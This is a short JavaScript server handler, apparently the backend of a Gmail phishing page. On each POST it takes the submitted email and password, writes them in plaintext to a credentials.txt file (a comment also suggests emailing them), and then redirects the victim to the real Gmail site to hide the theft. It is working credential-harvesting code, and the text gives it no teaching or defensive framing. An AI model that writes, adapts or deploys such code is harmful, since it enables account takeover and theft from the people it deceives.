export default function handler(req, res) {
    if (req.method === 'POST') {
        const { email, password } = req.body;

        // Save to a file or send to your email
        const fs = require('fs');
        fs.appendFile('credentials.txt', `Email: ${email}\nPassword: ${password}\n`, (err) => {
            if (err) throw err;
        });

        // Redirect to the actual Gmail login page
        res.writeHead(302, { Location: 'https://mail.google.com' });
        res.end();
    } else {
        res.setHeader('Allow', ['POST']);
        res.status(405).end(`Method ${req.method} Not Allowed`);
    }
}
